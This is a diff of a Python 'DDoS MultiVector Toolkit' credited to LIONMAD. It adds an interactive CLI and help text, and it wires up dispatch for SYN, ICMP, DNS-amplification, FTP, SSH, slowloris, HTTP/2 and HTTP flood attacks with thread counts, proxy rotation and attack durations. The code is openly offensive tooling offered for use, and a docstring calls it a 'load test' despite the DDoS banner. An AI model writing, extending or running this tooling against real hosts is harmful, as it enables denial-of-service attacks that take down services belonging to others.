@@ -14,34 +14,39 @@
 # License:           MIT License - https://opensource.org/licenses/MIT
 ### END INIT INFO ###
 
-import aiohttp  # Asynchronous HTTP requests for attack simulation.
-import asyncio  # Event loop for handling async tasks.
-import time  # Timing functions for attack intervals.
-import argparse  # Parsing command-line arguments.
-import threading  # Multithreading for concurrent attacks.
-from concurrent.futures import ThreadPoolExecutor, as_completed  # Managing parallel tasks.
-import random  # Randomization for payloads and attack patterns.
-import json  # Handling JSON configuration and outputs.
-from itertools import cycle  # Cycling iterators for proxy rotation.
-from collections import deque  # Efficient data handling for queues.
-from uuid import uuid4  # Unique identifiers for attack instances.
-from base64 import b64encode  # Encoding payloads for attacks.
-import hashlib  # Generating checksums for data integrity.
-import zlib  # Compressing data for payload optimization.
-import hmac  # Creating secure message digests.
-import signal  # Managing process signals (e.g., interruptions).
-import sys  # System-level functions (e.g., exiting on error).
-import os  # Operating system-level operations.
-import subprocess  # Running external commands/tools.
-import socket  # Creating and managing socket connections.
-import struct  # Handling low-level data structures.
-import logging  # Logging attack progress and errors.
-import psutil  # Monitoring system resource usage.
-import shutil  # File operations (copy, move, execute, etc.)
-import scapy.all as scapy  # Crafting and analyzing packets.
-import dns.resolver  # Resolving DNS queries for amplification.
-from colorama import init, Fore, Style  # Adding color to console outputs.
-from tqdm import tqdm  # Displaying progress bars during attacks.
+# =======================================
+#    Libraries Used in the Script
+# =======================================
+
+import aiohttp          # Asynchronous HTTP requests for simulating attacks.
+import asyncio          # Managing asynchronous tasks and event loops.
+import time             # Time-based operations like delays and performance tracking.
+import argparse         # Parsing command-line arguments.
+import threading        # Managing multi-threaded execution of tasks.
+from concurrent.futures import ThreadPoolExecutor, as_completed  # Running concurrent tasks in threads.
+import random           # Randomized data generation for attack patterns.
+import json             # Handling JSON data for configuration or logging.
+from itertools import cycle  # Iterating over proxies or targets repeatedly.
+from collections import deque  # High-performance queues for managing tasks or logs.
+from uuid import uuid4  # Generating unique identifiers for sessions or payloads.
+from base64 import b64encode  # Encoding payloads in Base64 format.
+import hashlib          # Cryptographic hashing for secure data handling.
+import zlib             # Data compression for efficient payload delivery.
+import hmac             # Message authentication using cryptographic hashes.
+import signal           # Handling system signals for clean shutdowns.
+import sys              # System-level operations like exit or argument parsing.
+import os               # Interacting with the file system and environment.
+import subprocess       # Running shell commands and external processes.
+import socket           # Low-level networking operations.
+import struct           # Working with binary data formats.
+import logging          # Recording execution logs and errors.
+import psutil           # Monitoring and managing system resource usage.
+import shutil           # File operations like copying or cleaning up temporary data.
+import scapy.all as scapy  # Crafting and analyzing network packets for attacks.
+import dns.resolver     # Resolving DNS queries for target IP addresses.
+from colorama import init, Fore, Style  # Adding color to terminal output for clarity.
+from tqdm import tqdm  # Progress bar for visual feedback during operations.
+import cmd              # Building interactive command-line interfaces.
 
 # Initialize colorama for colorized terminal output
 init(autoreset=True)
@@ -88,12 +93,37 @@ def display_banner():
 {BLUE}
 ██████████████████████████████████████████████████████
 ██                                                  ██
-██            DDoS MultiVector  Toolkit             ██
+██            DDoS MultiVector Toolkit              ██
 ██   USE WITH CAUTION, PROCEED AT YOUR OWN RISK.    ██                                  
 ██              LIONMAD SALUTES YOU                 ██
 ██                                                  ██
 ██████████████████████████████████████████████████████
 {RESET}
+""")
+
+def minimal_help():
+    print(f"""
+{YELLOW}DDoS MultiVector Toolkit Coded by LIONMAD
+{YELLOW}Usage: ddos [options]
+{RESET}
+Options:
+  -h, --help            Show the full help message and exit
+  -i, --interactive     Start the interactive CLI
+  -u URL, --url URL     Target URL or IP address
+  -a ATTACK_MODE, --attack-mode ATTACK_MODE
+                        Type of attack to perform (http-flood, ssh-flood, etc.)
+  -t THREADS, --threads THREADS
+                        Number of threads
+  -r RATE_LIMIT, --rate-limit RATE_LIMIT
+                        Rate limit for requests per second
+  -d DURATION, --duration DURATION
+                        Attack duration (seconds)
+  --proxies PROXIES     File containing proxy list
+  --results RESULTS     File to save results (JSON)
+{RESET}
+Example:
+  ddos -u 192.168.48.165
+  ddos -i  # Start interactive mode
 """)
 
 def parse_args():
@@ -114,6 +144,7 @@ def parse_args():
     parser.add_argument("--retry", type=int, default=3, help="Number of retries for failed requests")
     parser.add_argument("-user", "--user-agents", help="File containing custom user-agent strings")
     parser.add_argument("-m", "--multi-target", help="File containing multiple target URLs or IPs")
+    parser.add_argument("-i", "--interactive", action="store_true", help="Start the interactive CLI")
     return parser.parse_args()
 
 def load_proxies(proxy_file: str):
@@ -545,79 +576,91 @@ def signal_handler(sig, frame):
     stop_event.set()  # Signal all threads to stop
     sys.exit(0)
 
-async def main():
+class DDoSToolkitCLI(cmd.Cmd):
+    """Interactive CLI for the DDoS Toolkit."""
+    prompt = 'ddos_toolkit> '
+
+    def do_attack(self, arg):
+        """Start an attack with the specified parameters."""
+        args = arg.split()
+        if len(args) < 2:
+            print(f"{RED}Usage: attack <url> <attack-mode> [options]{RESET}")
+            return
+
+        target_url = args[0]
+        attack_mode = args[1]
+        options = args[2:]
+
+        # Parse options
+        parser = argparse.ArgumentParser()
+        parser.add_argument("-t", "--threads", type=int, default=10)
+        parser.add_argument("-r", "--rate-limit", type=int, default=100)
+        parser.add_argument("-p", "--pause", type=float, default=0.1)
+        parser.add_argument("-d", "--duration", type=int, default=1500)
+        parser.add_argument("--proxies", help="File containing proxy list")
+        parser.add_argument("--headers", help="Custom headers as JSON string")
+        parser.add_argument("--payload", choices=["json", "xml", "form"], default="json")
+        parser.add_argument("--retry", type=int, default=3)
+        parser.add_argument("--results", help="File to save results (JSON)")
+        parsed_args = parser.parse_args(options)
+
+        # Start the attack
+        asyncio.run(main(target_url, attack_mode, parsed_args))
+
+    def do_exit(self, arg):
+        """Exit the CLI."""
+        print(f"{GREEN}Exiting DDoS Toolkit CLI.{RESET}")
+        return True
+
+async def main(target_url, attack_mode, args):
     """Main function to run the load test."""
-    global args
-    args = parse_args()
+    global stop_event
+    stop_event = threading.Event()
 
     display_banner()
-
-    # If --anonymizer is provided, start or stop anonymizer and exit
-    if args.anonymizer:
-        print(f"{BLUE}[INFO] {'Starting' if args.anonymizer == 'start' else 'Stopping'} anonymizer...{RESET}")
-        run_anonymizer(args.anonymizer)
-        exit(0)
-
-    if args.threads <= 0 or args.pause <= 0 or args.duration <= 0 or args.rate_limit <= 0:
-        print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
-        exit(1)
-
-    # If --scan is provided, perform the scan and exit
-    if args.scan:
-        target = args.url.split("//")[-1].split("/")[0]
-        target_ip = await resolve_target(target)
-        if target_ip:
-            run_network_scanner(target_ip)
-        else:
-            print(f"{RED}Exiting: Target is not reachable.{RESET}")
-        exit(0)
 
     proxies = load_proxies(args.proxies) if args.proxies else []
     if proxies:
         proxies = validate_proxies(proxies)
-        # Start proxy health monitoring in a separate thread
         asyncio.create_task(monitor_proxy_health(proxies))
 
     headers = json.loads(args.headers) if args.headers else None
 
-    target = args.url.split("//")[-1].split("/")[0]
-
-    if not await resolve_target(target):
+    if not await resolve_target(target_url):
         print(f"{RED}Exiting: Target is not reachable.{RESET}")
-        exit(1)
+        return
 
-    stop_event = threading.Event()
     tasks = []
 
-    if args.attack_mode == "syn-flood":
-        target_ip = await resolve_target(target)
+    if attack_mode == "syn-flood":
+        target_ip = await resolve_target(target_url)
         target_port = 80  # Default port for SYN flood
         threading.Thread(target=syn_flood, args=(target_ip, target_port, args.duration)).start()
-    elif args.attack_mode == "icmp-flood":
-        target_ip = await resolve_target(target)
+    elif attack_mode == "icmp-flood":
+        target_ip = await resolve_target(target_url)
         threading.Thread(target=icmp_flood, args=(target_ip, args.duration)).start()
-    elif args.attack_mode == "dns-amplification":
-        target_ip = await resolve_target(target)
+    elif attack_mode == "dns-amplification":
+        target_ip = await resolve_target(target_url)
         threading.Thread(target=dns_amplification, args=(target_ip, args.duration)).start()
-    elif args.attack_mode == "ftp-flood":
-        target_ip = await resolve_target(target)
+    elif attack_mode == "ftp-flood":
+        target_ip = await resolve_target(target_url)
         target_port = 21  # Default port for FTP
         threading.Thread(target=ftp_flood, args=(target_ip, target_port, args.duration)).start()
-    elif args.attack_mode == "ssh-flood":
-        target_ip = await resolve_target(target)
+    elif attack_mode == "ssh-flood":
+        target_ip = await resolve_target(target_url)
         target_port = 22  # Default port for SSH
         threading.Thread(target=ssh_flood, args=(target_ip, target_port, args.duration)).start()
-    elif args.attack_mode == "slowloris":
+    elif attack_mode == "slowloris":
         for _ in range(args.threads):
-            task = asyncio.create_task(slowloris_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.retry))
+            task = asyncio.create_task(slowloris_attack(target_url, stop_event, args.pause, args.rate_limit, proxies, headers, args.retry))
             tasks.append(task)
-    elif args.attack_mode == "http2-flood":
+    elif attack_mode == "http2-flood":
         for _ in range(args.threads):
-            task = asyncio.create_task(http2_flood(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
+            task = asyncio.create_task(http2_flood(target_url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
             tasks.append(task)
     else:
         for _ in range(args.threads):
-            task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
+            task = asyncio.create_task(rate_limited_attack(target_url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
             tasks.append(task)
 
         # Display status in a separate thread
@@ -637,15 +680,23 @@ async def main():
     if args.results:
         print(f"{GREEN}Results saved to {args.results}{RESET}")
 
-    # If --anonymizer is provided, stop anonymizer after the attack
-    if args.anonymizer == "start":
-        print(f"{BLUE}[INFO] Stopping anonymizer...{RESET}")
-        run_anonymizer("stop")
-
 if __name__ == "__main__":
     # Handle signals for graceful exit
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
 
-    # Run the asyncio event loop
-    asyncio.run(main())
+    # Parse arguments
+    args = parse_args()
+
+    # If no arguments are provided, display minimal help
+    if len(sys.argv) == 1:
+        minimal_help()
+        sys.exit(0)
+
+    # If interactive mode is enabled, start the CLI
+    if args.interactive:
+        cli = DDoSToolkitCLI()
+        cli.cmdloop()
+    else:
+        # Otherwise, run the attack directly
+        asyncio.run(main(args.url, args.attack_mode, args))
